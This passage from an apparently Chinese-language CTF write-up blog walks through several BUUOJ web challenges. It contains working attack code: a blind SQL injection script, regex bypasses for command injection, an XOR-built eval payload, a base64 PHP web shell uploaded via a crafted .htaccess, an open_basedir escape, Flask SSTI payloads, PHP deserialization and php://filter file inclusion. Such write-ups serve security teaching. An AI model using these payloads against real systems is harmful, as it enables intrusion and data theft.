title="examplename"><p>上传成功了，下面上传之前的jpg文件应该能成功了</p><p>这里注意的是，&lt;?被过滤了，以js的形式写🐎，上传后用蚁剑</p><img src="/2020/05/16/buuoj3/4.png" class="" title="examplename"><h4 id="0X04-CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#0X04-CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="0X04:[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>0X04:[CISCN2019 总决赛 Day2 Web1]Easyweb</h4><p>没发现什么有用的东西，御剑扫描，发现了robots.txt,访问</p><img src="/2020/05/16/buuoj3/5.png" class="" title="examplename"><p>想不到有啥，看了网页源码看到个image，猜测可能会是，意外，拿到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?$_GET[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">"path"</span>])?$_GET[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path);</span><br><span class="line">$result=mysqli_query($con,<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line">$path=<span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure><p>经过测试，发现用\\0可以输出\，达到目的</p><p>这道题看了wp，用的是盲注，这里直接贴一下脚本吧，自己看看就懂啥意思了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://a733f818-a663-4ff3-9338-435c6195bf93.node3.buuoj.cn/image.php"</span></span><br><span class="line">response = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    high=<span class="number">127</span></span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    mid=(low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        payload = <span class="string">'or id = if(ascii(substr((select password from users limit 1 offset 0),%d,1))&gt;%d,1,0)#'</span>%(i,mid)</span><br><span class="line">        params=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">'\\0'</span>,</span><br><span class="line">            <span class="string">'path'</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        txt = requests.get(url,params=params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'JFIF'</span> <span class="keyword">in</span> txt.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">    response+=chr(int(mid))</span><br><span class="line">    print(response)</span><br></pre></td></tr></table></figure><p>注出的密码是12a0811ae7c390765ab4，账户名直接猜的admin，登录，发现是文件上传，用小马以jpg文件上传，连接不上，别的师傅说是用短标签，来试试</p><img src="/2020/05/16/buuoj3/6.png" class="" title="examplename"><p>成功上传了，蚁剑成功连接，在根目录下找到flag</p><h4 id="0X05-FBCTF2019-RCEService"><a href="#0X05-FBCTF2019-RCEService" class="headerlink" title="0X05:[FBCTF2019]RCEService"></a>0X05:[FBCTF2019]RCEService</h4><p>打开题目，可以使用的是json格式的命令查询</p><p>先试一下{“cmd”:”ls”}，提示非法输入，换成其他的执行命令都不太行，看了一篇别的师傅的wp，说是原题有给源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">'PATH=/home/rceservice/jail'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Attempting to run command:&lt;br/&gt;'</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="keyword">true</span>)[<span class="string">'cmd'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="keyword">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Invalid input'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>preg_match只会匹配一行的内容，这里可以用换行符%0A来绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：?cmd&#x3D;&#123;%0A&quot;cmd&quot;: &quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0A&#125; 这个路径挺难找的23333</span><br><span class="line"></span><br><span class="line">&#123;%asset_img 7.png examplename%&#125;</span><br></pre></td></tr></table></figure><p>还有一种方法是利用prce回溯次数限制绕过，p神文章：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html，可以去看看试一下" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html，可以去看看试一下</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = <span class="string">'&#123;"cmd":"/bin/cat /home/rceservice/flag","zz":"'</span> + <span class="string">"a"</span>*(<span class="number">1000000</span>) + <span class="string">'"&#125;'</span></span><br><span class="line">res = requests.post(<span class="string">"http://af72594c-dbfc-4ef9-baa3-0738dbb5fdb9.node3.buuoj.cn/"</span>, data=&#123;<span class="string">"cmd"</span>:payload&#125;)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h4 id="0X06-SUCTF-2019-EasyWeb"><a href="#0X06-SUCTF-2019-EasyWeb" class="headerlink" title="0X06:[SUCTF 2019]EasyWeb"></a>0X06:[SUCTF 2019]EasyWeb</h4><p>源码审</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;<span class="comment">//文件夹feikong</span></span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);<span class="comment">//$name匹配到.号最后的位置下标+1，匹配$name中n+1个字符</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); <span class="comment">//匹配到ph结束</span></span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);<span class="comment">//不能在$tmp_name中匹配到<span class="meta">&lt;?</span></span></span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); <span class="comment">//判断为图片格式</span></span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;<span class="comment">//路径</span></span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">////?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag</span></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);<span class="comment">//      !#$%()*+-/:;&lt;&gt;?@\]^&#123;&#125;</span></span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先来看代码执行调用get_the_flag部分</p><p>对长度进行了限制，正则表达式fuzz一下，!#$%()*+-/:;&lt;&gt;?@]^{}是可用的，这里想到的是用异或构造payload，下面是生成需要字符的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">find = [<span class="string">'G'</span>,<span class="string">'E'</span>,<span class="string">'T'</span>,<span class="string">'_'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result = chr(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a = i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            b = j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            a = urllib.parse.quote(a)</span><br><span class="line">            b = urllib.parse.quote(b)</span><br><span class="line">            print(<span class="string">"%s:%s^%s"</span>%(result,a,b))</span><br></pre></td></tr></table></figure><p>凑出这部分的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe&#x3D;get_the_flag</span><br></pre></td></tr></table></figure><p>下面再看函数部分，&lt;?被过滤，使用了exif_imagetype来判断是不是图片，文件后缀不能出现ph</p><p>这里的php版本是7.2的，不能用&lt;script&gt;标签的方式来绕过&lt;?,这里可以用base64编码绕过，在.htaccess中利用php伪协议进行解码</p><p>shell.abc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a12</span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsnYyddKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>.htacess</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337 </span><br><span class="line">AddType application&#x2F;x-httpd-php .abc</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_fd40c7f4125a9b9ff1a4e75d293e3080&#x2F;shell.abc&quot;</span><br></pre></td></tr></table></figure><p>上传脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b"""</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .abc</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.abc"</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">shell = <span class="string">b"GIF89a12"</span> + base64.b64encode(<span class="string">b"&lt;?php eval($_REQUEST['a']);?&gt;"</span>)</span><br><span class="line">url = <span class="string">"http://16855023-61d5-430f-bbef-53d0bca8f179.node1.buuoj.cn?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag"</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>:(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>:(<span class="string">'shell.abc'</span>,shell,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>访问?a=phpinfo();可以得到phpinfo页面，这里不知道什么原因做的时候没法回显，下面的知识点是参考的</p><p>这时会发现存在open_basedir和disable_functions的限制 </p><p>open_basedir:/var/www/html/:/tmp/（附上payload链接：<a href="https://xz.aliyun.com/t/4720）" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720）</a></p><p>这是最后的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(file_get_contents(&#39;&#x2F;THis_Is_tHe_F14g&#39;));</span><br></pre></td></tr></table></figure><h4 id="0X06：-GYCTF2020-FlaskApp"><a href="#0X06：-GYCTF2020-FlaskApp" class="headerlink" title="0X06：[GYCTF2020]FlaskApp"></a>0X06：[GYCTF2020]FlaskApp</h4><p>这是之前比赛做出来过的题，用的是拼接，做出来之后复现失败了，现在buu上有了，再来做一次记录一下</p><p>这是一道SSTI模板注入，先编码再解码，可以得到需要的信息，题目是flask，去找flask对应的模板注入即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><img src="/2020/05/16/buuoj3/8.png" class="" title="examplename"><p>可以看到源码，下面是源码中的WAF</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(str)</span>:</span> black_list = [&amp;<span class="comment">#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;]</span></span><br></pre></td></tr></table></figure><p>可以看到flag，os，system等都被过滤了，这里可以用拼接来进行绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__imp'</span>+<span class="string">'ort__'</span>](<span class="string">'o'</span>+<span class="string">'s'</span>).listdir(<span class="string">'/'</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#e3snJy5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fWydfX2J1aWx0aW5zX18nXVsnX19pbXAnKydvcnRfXyddKCdvJysncycpLmxpc3RkaXIoJy8nKX19</span></span><br></pre></td></tr></table></figure><img src="/2020/05/16/buuoj3/9.png" class="" title="examplename"><p>可以看到flag文件</p><p>这次用一下切片取反字符串，省去拼接flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'txt.galf_eht_si_siht/'</span>[::<span class="number">-1</span>],<span class="string">'r'</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"><span class="comment">#eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbigndHh0LmdhbGZfZWh0X3NpX3NpaHQvJ1s6Oi0xXSwncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</span></span><br></pre></td></tr></table></figure><img src="/2020/05/16/buuoj3/10.png" class="" title="examplename"><h4 id="0X07：-NPUCTF2020-ReadlezPHP"><a href="#0X07：-NPUCTF2020-ReadlezPHP" class="headerlink" title="0X07：[NPUCTF2020]ReadlezPHP"></a>0X07：[NPUCTF2020]ReadlezPHP</h4><p>打开是一个网页，在网页源码找到了跳转链接，拿到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure><p>是一道简单的php反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$c = <span class="keyword">new</span> HelloPhp; </span><br><span class="line">$c-&gt;a=<span class="string">'phpinfo()'</span>;</span><br><span class="line">$c-&gt;b=<span class="string">'assert'</span>;<span class="comment">//assert是尝试了别的执行函数后发现的</span></span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line"><span class="comment">//O:8:"HelloPhp":2:&#123;s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";&#125;</span></span><br></pre></td></tr></table></figure><p>把序列化数据传给data，在phpinfo页面找到flag，或者网页源码处也可以</p><img src="/2020/05/16/buuoj3/11.png" class="" title="examplename"><h4 id="0X08：-BSidesCF-2020-Had-a-bad-day"><a href="#0X08：-BSidesCF-2020-Had-a-bad-day" class="headerlink" title="0X08：[BSidesCF 2020]Had a bad day"></a>0X08：[BSidesCF 2020]Had a bad day</h4><p>打开题目，有按钮，随便点一个url出来的形式应该是sql或者文件包含，尝试包含index.php</p><img src="/2020/05/16/buuoj3/12.png" class="" title="examplename"><p>出错了，去掉了.php后缀成功包含，base64解码，贴一下主要的php部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'category'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( strpos( $file, <span class="string">"woofers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"meowers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"index"</span>))&#123;</span><br><span class="line"><span class="keyword">include</span> ($file . <span class="string">'.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry, we currently only support woofers and meowers."</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可见要想包含成功,category参数值中要有woofers，meowers或者index，只需要用伪协议套一层协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;40a3219f-a796-4a79-9c4f-0dcd86f4e96a.node3.buuoj.cn&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;woofers&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure><img src="/2020/05/16/buuoj3/13.png" class="" title="examplename"><p>base64解码就能够看到flag了</p><h4 id="0X09：-WUSTCTF2020-颜值成绩查询"><a href="#0X09：-WUSTCTF2020-颜值成绩查询" class="headerlink" 